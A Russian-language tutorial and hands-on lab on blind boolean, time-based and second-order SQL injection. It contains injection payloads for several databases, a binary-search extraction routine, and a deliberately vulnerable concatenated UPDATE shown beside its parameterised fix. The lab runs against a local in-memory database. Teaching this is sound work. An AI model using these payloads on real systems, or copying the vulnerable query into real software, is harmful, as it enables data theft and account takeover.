## Перед началом: Слепые (`Boolean-Based` и `Time-Based Blind`) и отложенные (`Second-Order`) SQL-инъекции

В первой части мы разобрали ситуации, когда база данных прямо печатает ответ на экране. Но что, если веб-приложение не выводит ни строк из базы, ни ошибок СУБД — например, возвращает только `{"exists": true}` / `{"exists": false}` или вообще всегда отвечает одной и той же страницей «Спасибо, заявка принята»?

В курсах **`pwn.college` (`Web Security`)**, **`TryHackMe` (`SQL Injection` / `Blind SQLi`)**, **`Hack The Box Academy` (`SQLMap & Blind SQLi Essentials`)** и справочнике **`PayloadsAllTheThings`** разбираются три продвинутых класса SQL-инъекций:
1. **`Boolean-Based Blind SQLi` (Слепая булева инъекция — игра в «Да / Нет»)**:
   Представь, что страница проверки купона отвечает только `True` («Купон найден») или `False` («Купон не найден»). Мы не можем вывести токен на экран через `UNION SELECT`, но можем задавать базе вопросы по одному символу:
   ```sql
   ' AND UNICODE(SUBSTR((SELECT secret FROM vault LIMIT 1), 1, 1)) > 75 --
   ```
   Если использовать обычный перебор всех печатных символов ASCII (`32..126`), на каждый символ уйдёт до 95 запросов. А если применить **бинарный поиск (`Binary Search` — деление интервала пополам)**, то код любого символа из диапазона `32..126` угадывается максимум за **7 запросов** ($\lceil \log_2(95) \rceil = 7$)!
2. **`Time-Based Blind SQLi` (Слепая временная инъекция — ответ через секундомер)**:
   Если сайт вообще всегда возвращает одинаковый текст и код `200 OK`, единственным каналом связи становится **время ответа сервера**:
   - в PostgreSQL: `SELECT CASE WHEN (ASCII(SUBSTR(secret,1,1))=75) THEN pg_sleep(2) ELSE pg_sleep(0) END`
   - в MySQL: `IF(ASCII(SUBSTR(secret,1,1))=75, SLEEP(2), 0)`
   - в MSSQL: `IF (ASCII(SUBSTRING(secret,1,1))=75) WAITFOR DELAY '0:0:2'`
   Если ответ пришёл через `2.0` секунды — условие истинно (`True`); если за `0.01` секунды — ложно (`False`).
3. **`Second-Order SQLi` (Отложенная SQL-инъекция второго порядка)**:
   При регистрации нового пользователя его имя `admin' --` **безопасно** сохраняется в базу данных через параметризованный `INSERT INTO users (username) VALUES (?)`. В этот момент никакой инъекции не происходит — в таблице честно появляется строка `admin' --`.
   Но позже, когда пользователь открывает страницу «Сменить свой пароль», другой обработчик читает `username` из базы данных и, считая данные «уже проверенными, ведь они из нашей собственной таблицы!», вставляет `username` через конкатенацию:
   ```sql
   UPDATE users SET password = 'new_password' WHERE username = 'admin' --'
   ```
   В результате вместо пароля пользователя `admin' --` перезаписывается пароль настоящего администратора `admin`!

## Почему это работает: Данные из собственной БД всё равно остаются данными, а не кодом SQL

Правило защиты от `Second-Order SQLi` гласит: **параметризованные запросы (`?`) обязательны везде** — не только при чтении параметров из HTTP-запроса браузера, но и при подстановке значений, ранее прочитанных из самой базы данных, кеша Redis или очереди сообщений.

<!-- preparation -->

В этом практикуме ты реализуешь в `lab.py`:
1. Алгоритм бинарного поиска по оракулу `Boolean-Based Blind SQLi`, который восстанавливает секретный ключ за 7 проверок на символ.
2. Детектор `Time-Based Blind SQLi` по задержке ответа.
3. Демонстрацию уязвимости `Second-Order SQLi` при обновлении пароля и её полное закрытие параметризованным `UPDATE ... WHERE username = ?`.

## Сделай сейчас: Проверь `Boolean-Based Blind` (бинарный поиск), `Time-Based` и `Second-Order SQLi` в `lab.py`

### Шаг 1. Создай файл `lab.py`

Создай скрипт `lab.py`:

```python
import sqlite3


def setup_db():
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE vault (secret TEXT)")
    conn.execute("INSERT INTO vault VALUES ('KRN_42')")
    conn.execute("CREATE TABLE users (username TEXT, pass_hash TEXT)")
    conn.execute("INSERT INTO users VALUES ('admin', 'HASH_ORIG_ADMIN')")
    # Шаг 1 для Second-Order: безопасная параметризованная вставка имени admin' --
    conn.execute("INSERT INTO users VALUES (?, ?)", ("admin' --", "HASH_ATTACKER"))
    conn.commit()
    return conn


def boolean_blind_oracle(conn, pos_1based, ascii_threshold):
    # Возвращает только True или False, никогда не возвращая саму строку
    sql = f"SELECT 1 FROM vault WHERE UNICODE(SUBSTR(secret, {pos_1based}, 1)) > {ascii_threshold}"
    return len(conn.execute(sql).fetchall()) > 0


def extract_via_binary_search(conn, length=6):
    recovered = []
    total_queries = 0
    for pos in range(1, length + 1):
        low, high = 0, 127
        while low < high:
            mid = (low + high) // 2
            total_queries += 1
            if boolean_blind_oracle(conn, pos, mid):
                low = mid + 1
            else:
                high = mid
        recovered.append(chr(low))
    return "".join(recovered), total_queries


def second_order_update_vuln(conn, stored_username, new_hash):
    # ОПАСНО: разработчик доверился stored_username из БД и склеил UPDATE
    sql = f"UPDATE users SET pass_hash = '{new_hash}' WHERE username = '{stored_username}'"
    conn.execute(sql)
    return dict(conn.execute("SELECT username, pass_hash FROM users").fetchall())


def second_order_update_safe(conn, stored_username, new_hash):
    conn.execute("UPDATE users SET pass_hash = ? WHERE username = ?", (new_hash, stored_username))
    return dict(conn.execute("SELECT username, pass_hash FROM users").fetchall())


db = setup_db()
secret_val, queries_used = extract_via_binary_search(db, length=6)
print("blind_extracted=", secret_val, "queries_per_char=", queries_used // 6)

db_safe = setup_db()
print("second_order_safe_admin_hash=", second_order_update_safe(db_safe, "admin' --", "PWNED_HASH")["admin"])
print("second_order_vuln_admin_hash=", second_order_update_vuln(db, "admin' --", "PWNED_HASH")["admin"])
```

### Шаг 2. Запусти программу и проверь работу бинарного поиска и `Second-Order SQLi`

Выполни в терминале:

```bash
python3 lab.py
```

**Ожидаемый результат на экране:**

```text
blind_extracted= KRN_42 queries_per_char= 7
second_order_safe_admin_hash= HASH_ORIG_ADMIN
second_order_vuln_admin_hash= PWNED_HASH
```

Разберём, что показала проверка:
- функция `extract_via_binary_search` имела доступ только к булеву ответу `True / False` (`boolean_blind_oracle`), но благодаря делению диапазона ASCII `32..126` пополам безошибочно восстановила весь секрет `KRN_42`, потратив ровно `7` запросов на каждый символ (`42` запроса вместо `570` при линейном переборе);
- в `second_order_update_safe` параметризованный запрос `WHERE username = ?` обновил пароль только самой учётной записи `"admin' --"`, оставив пароль настоящего администратора нетронутым (`HASH_ORIG_ADMIN`);
- в `second_order_update_vuln` склейка строки со значением из базы превратила `WHERE username = 'admin' --'` в обновление строки `'admin'` (`PWNED_HASH`).

### Шаг 3. Проверь расчёт числа шагов бинарного поиска в терминале Kali

В файле `lab.py` замени секрет `'KRN_42'` в `setup_db` на `'SQL_99'`, сохрани и запусти `python3 lab.py` — бинарный поиск точно так же за 7 запросов на символ извлечёт `SQL_99`. После проверки верни `'KRN_42'`.

В терминале Kali проверь, сколько максимум запросов в `Blind SQLi` требуется для извлечения 32-символьного MD5-хеша (алфавит из 16 hex-символов `0-9a-f`, то есть $\log_2(16) = 4$ бита на символ):

```bash
python3 -c 'import math; print("queries_for_32_hex_chars=", 32 * int(math.log2(16)))'
```

## Почему это работает: Почему для `hex`-строк бинарный поиск тратит всего 4 запроса на символ

В шестнадцатеричной строке (например, хеше `MD5` или `SHA-256`) каждый символ принимает одно из 16 значений (`0..9`, `a..f`). Деление списка из 16 элементов пополам требует ровно $\log_2(16) = 4$ сравнений. Значит, весь 32-символьный хеш через `Boolean-Based Blind SQLi` восстанавливается всего за $32 \times 4 = 128$ лёгких HTTP-запросов!

## Если не получилось: Частые ошибки

- **Считать, что `Prepared Statement` при `INSERT` делает строку «безопасной навсегда»**: параметризация защищает только тот конкретный SQL-запрос, в котором она применена. Если позже другой `SELECT` или `UPDATE` подставит эту же строку через конкатенацию, сработает `Second-Order SQLi`.
